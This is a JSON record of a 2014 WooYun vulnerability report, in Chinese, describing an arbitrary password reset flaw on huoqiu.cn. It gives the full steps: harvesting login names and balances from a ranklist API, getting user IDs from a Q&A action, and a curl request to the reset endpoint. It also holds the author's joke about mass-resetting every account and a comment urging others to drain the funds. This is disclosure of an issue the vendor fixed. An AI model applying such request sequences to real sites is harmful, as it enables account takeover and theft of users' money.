{"id": 48681, "wybug_id": "wooyun-2014-082047", "wybug_title": "火球网任意用户密码重置漏洞附官方百万余额账户演示", "wybug_corp": "huoqiu.cn", "wybug_author": "秋风", "wybug_date": "2014-11-05 15:16", "wybug_open_date": "2014-12-20 15:18", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "安全意识不足", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向公众公开  简要描述： 我赚钱啦 赚钱啦! 我都不知道怎么去花. 我左手买个诺基亚右手买个摩托罗拉, 我移动联通小灵通一天换一个电话号码呀, 我坐完奔驰开宝马没事洗桑拿吃龙虾. 详细说明：  该重置密码接口需要一个用户唯一编号，由于火球网整个架构基本都不涉及这个参数，找了好些时间才发现这玩意儿！先说登陆，我们有了用户邮箱（这里不一定是邮箱，测试的结果发现用户登录的用户名是唯一的）和密码才能登陆。走吧，跟我一起去瞅瞅百万余额账户，也变土豪了？#0 寻找用户名(登陆处使用)\n接口地址:https://www.huoqiu.cn//plan/ranklist.json{\"ranklist\":[{\"totalSum\":2000000.00,\"nick\":\"xkbear\"},{\"totalSum\":1300000.00,\"nick\":\"jian***@huoqiur.com\"},{\"totalSum\":1100000,\"nick\":\"风卷残云\"},{\"totalSum\":502032.00,\"nick\":\"3388\"},{\"totalSum\":500000.00,\"nick\":\"Luna\"},{\"totalSum\":500000.00,\"nick\":\"18858\"},{\"totalSum\":395451.00,\"nick\":\"眼界投资\"},{\"totalSum\":354003.00,\"nick\":\"Jun_otakugame\"},{\"totalSum\":348001.00,\"nick\":\"huoqiu_tesla\"},{\"totalSum\":340760.00,\"nick\":\"forreach\"},{\"totalSum\":333489.00,\"nick\":\"6lay\"}],\"success\":true}登陆用户名泄露（这里有个土豪邮箱jian***@huoqiur.com，仅猜测为登陆用户名，将在下边证实）。\n#1 寻找用户唯一编号（重置密码需要）\n相关地址:https://www.huoqiu.cn/asks/257.html问答模块->赞同问答模块->取消赞同（服务器将回该用户详细数据，我获取到的是22603，不做演示）\n#2 重置用户接口\n接口地址:https://www.huoqiu.cn/login/reset_password.json所需必要POST参数三个：id=22603&password=123456&passwordRepeated=123456参数解释：id->用户唯一编号password->用户新密码passwordRepeated->确认密码curl \"https://www.huoqiu.cn/login/reset_password.json\" -H \"Cookie: JSESSIONID=1EF802698A1816E34026FD50FC92A4B0;\" -H \"CSRFToken: dc8b11a8-73b0-45a8-b33e-0837e763193f\" --data \"id=22603&password=123456&passwordRepeated=123456\"如重置成功，服务器将返回：{\"success\":true}\n最后想说。。。如果哪位将有序的用户编号全遍历一遍，然后把全站用户密码改为123456。。。哎，又猥琐了一把！   漏洞证明：  \n\n\n\n\n\n   修复方案：  邮箱验证的rand随机码利用起来   版权声明：转载请注明来源 秋风@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-11-05 16:07 厂商回复： 感谢，我们会尽快修复. 最新状态： 2014-11-05：已修复.  ", "replys": "漏洞评价：\n评论\n     2014-11-05 09:25 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1141 漏洞数:253        | 爱生活、爱腾讯、爱网络！)\t\t \n  卧槽，LZ真的啊，趁在线厂商还没确认快去把钱刷完~    \n     2014-11-05 19:30 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  火球网团队花了不到1个小时就把问题解决，这修复速度很赞！ 希望其他企业也能做到这么快修复    \n     2014-11-05 21:07 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  给厂商的响应速度点个赞！    \n     2014-11-06 22:40 |    \t\thack2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 关注信息安全 http://www.waitalone.cn/)\t\t \n  哥正在帮他们做渗透测试，还没有做完，结果被你提交了漏洞，害我被骂，唉，你们这些人呀。。    \n     2014-12-20 18:05 |    \t\t暧昧 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 此号乃是吾用来装孙子也)\t\t \n  给厂商的响应速度点个赞！    \n     2014-12-22 14:56 |    \t\t盛大网络(乌云厂商)\t\t \n  求任意重置密码 splus.sdo.com  idplus.sdo.com      \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}